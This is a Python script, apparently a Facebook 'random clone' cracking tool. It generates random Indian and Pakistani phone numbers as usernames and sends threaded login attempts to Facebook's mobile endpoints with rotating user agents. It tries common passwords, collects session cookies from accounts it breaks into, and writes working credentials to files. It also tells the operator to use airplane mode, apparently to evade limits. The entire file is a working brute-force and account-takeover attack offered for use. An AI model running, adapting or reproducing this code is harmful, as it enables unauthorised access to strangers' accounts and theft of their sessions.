'Mozilla/5.0 (Linux; U; Android 6.0; en-us; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.0.9'
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1901 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.0.1'
'Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1901 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.0.1'
'Mozilla/5.0 (Linux; U; Android 9; en-us; CPH1955 Build/PKQ1.190101.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/25.5.0.9'
'Mozilla/5.0 (Linux; U; Android 8.1.0; fr-fr; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-gb; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.1'
'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.0.1'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.3'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.1'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.1'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.3'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.3'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101'
'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.3'
'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.3']

logo =(""" \033[1;32m 
     _    _   _ __  __ _____ ____    ____ ___ _        _    _     
    / \  | | | |  \/  | ____|  _ \  | __ )_ _| |      / \  | |    
   / _ \ | |_| | |\/| |  _| | | | | |  _ \| || |     / _ \ | |    
  / ___ \|  _  | |  | | |___| |_| | | |_) | || |___ / ___ \| |___ 
 /_/   \_\_| |_|_|  |_|_____|____/  |____/___|_____/_/   \_\_____|
                                                                  
\033[1;37m------------------------------------
\033[1;37m Owner   : AHMED BILAL 
\033[1;37m Facebook: AHMED BILAL
\033[1;37m Github  : PRIVATE 
\033[1;37m Version : 1.1
\033[1;37m------------------------------------
\33[1;97m\33[42m[\33[1;31mTOOLS\x1b[38;5;208m: \33[1;31mAHMED BILAL  RANDOM CLONE TOOL \33[1;97m-1.0\33[1;97m]\x1b[0m
\33[1;92m---------------------------------------""") 

loop = 0
oks = []
cps = []

#global functions
def dynamic(text):
	titik = ['.   ','..  ','... ','.... ']
	for o in titik:
		print('\r'+text+o),
		sys.stdout.flush();time.sleep(1)
def menu():
	os.system('clear')
	print(logo)
	print('\033[1;32m------------------------------------')
	print('[1] RANDOM CLONING ')
	print('[2] FOLLOWE MY FB')
	print('[0] EXIT')
	print(47*"-")
	opt = input('[?] Choose : ')
	if opt =='1':
		random_crack()
	if opt =='2':
		os.system("xdg-open https://www.facebook.com/profile.php?id=61551923680274")
		menu()
    #if opt =='0':
    	#exit()
    #else:
    	#print('choice valid code')
    #menu()
def cek_apk(session,coki):
    w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r Ã°Å¸Å½Â®  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://p.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cooki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r Ã°Å¸Å½Â®  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))
   
def random_crack():
	os.system('clear')
	print(logo)
	print('[1]\033[1;97m [-IND RANDOM-] ')
	print('[2]\033[1;97m [-PAK RANDOM-] ')
	print('[0]\033[1;97m [-BD RANDOM-] ')
	print(47*'-')
	opt = input('[?] Choose : ')
	if opt =='1':
		random_number()
	elif opt =='2':
		random_pak_number()
	elif opt =='0':
		menu()
	else:
		print('\033[1;91mChoose valid option\033[0;97m')

def random_number():
	user=[]
	os.system('clear')
	print(logo)
	print("\033[1;32m INDIA code : 9670,9919,9918,8795,9915")
	print(47*'-')
	kode = input('[?] Choice sim Code : ')
	print(47*'-')
	os.system('clear')
	print(logo)
	print(' EXAMPLE CLONE : 2000  3000 4000 5000')
	print('------------------------------------')
	limit = int(input('[?]\033[1;97m LIMIT CLONE : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(6))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print(47*'-')
		print('[+] TOTAL YOUR IDS  : \033[1;92m'+tl)
		print('[?] \033[1;35mCHOICE SIM CODE : \033[1;32m'+kode)
		print('\033[1;37;1m[•] CHOICE YUR CONTORY :(\033[1;96mINDIA\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = [guru]
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	print(' Press Inter To Back Menu')
	menu()
	
    
def rcrack(uid,pwx,tl):
	global loop
	global oks
	global agents
	try:
		for ps in pwx:
			session = requests.Session()
			pro = random.choice(agents)
			free_fb = session.get('https://p.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority': 'free.facebook.com',
			'method': 'POST',
			'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,}
			lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\033[1;92m[AHMED-BILAL-OK] '+uid+' | '+ps+'\033[0;97m')
				print(f"\033[1;33mCOOKIE : \033[1;97m{coki}")
				open('AHMED-BILAL-ok.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\n\033[1;91m[AHMED-BILAL-CP] '+uid+' | '+ps+'\033[0;97m')
				#print(f"\n\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f'\r\033[m[AHMED-BILAL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
		sys.stdout.flush()
	except:
		pass

def random_pak_number():
	user=[]
	os.system('clear')
	print(logo)
	print('[+] PK code  : 92303,92306,92309,92305,92307')
	print(47*'-')
	kode = input('[?] Choice Code : ')
	os.system('clear')
	print(logo)
	print(' EXAMPLE CLONE : 2000  3000 4000 5000')
	print('------------------------------------')
	limit = int(input('[?] CLONE LIMIT : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print(47*'-')
		print('[+] YOUR TOTAL IDS : \033[1;92m'+tl)
		print('[?] \033[1;97mCHOICE SIM CODE : \033[1;92m'+kode)
		print('\033[1;37;1m[•] YOUR CONTORY (\033[1;92mPakistan\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = ['guru','khankhan','khankhan123','malikmalik','baloch','pakarmy','khan12345','alikhan12345','ayesha786','janjan','ali1122','khann1122','khan12','khan123','khan786']
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	print(' Press Inter To Back Menu')
	menu()
    
def rcrack(uid,pwx,tl):
	global loop
	global oks
	global agents
	try:
		for ps in pwx:
			session = requests.Session()
			pro = random.choice(agents)
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority': 'p.facebook.com',
    'method': 'GET',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
    'sec-ch-ua-full-version-list': '"Chromium";v="122.0.6261.111", "Not(A:Brand";v="24.0.0.0", "Google Chrome";v="122.0.6261.111"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Nexus 5"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"6.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; V2024; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',}
			lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\033[1;92m[AHMED-BILAL-OK] '+uid+' | '+ps+'\033[0;97m')
				print(f"\033[1;33mCOOKIE : \033[1;97m{coki}")
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[AHMED-BILAL-CP] '+uid+' | '+ps+'\033[0;97m')
				#print(f"\n\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r[\033[1;92mAHMED-BILAL\033[1;97m] [%s/%s]>[\033[1;32mOK\033[1;97m:-\033[1;92m%s\033[1;97m]-[CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
menu() 
